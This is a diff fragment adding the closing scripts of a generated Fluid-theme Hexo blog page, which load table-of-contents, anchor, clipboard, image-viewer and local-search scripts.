+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/Crow.github.io/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/Crow.github.io/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
